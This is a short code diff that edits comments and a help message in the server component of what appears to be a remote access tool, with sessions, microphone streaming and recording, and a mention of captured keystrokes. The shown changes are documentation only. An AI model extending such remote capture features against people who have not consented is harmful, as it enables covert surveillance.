@@ -181,6 +181,7 @@ class Server(object):
                 microphoneStream.stop()
                 break
 
+    # starting microphone streaming
     def micStream(self, args):
         if self.userAttached:
             self.sendLastCommand()
@@ -191,8 +192,9 @@ class Server(object):
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
-            printr(f'Info: Stop the keyboard listener and save the captured keys.')
-
+            printr(f'Info: Starts a microphone streaming.')
+    
+    # recording microphone audio
     def micRecord(self, args):
         if self.userAttached:
             self.sendLastCommand()
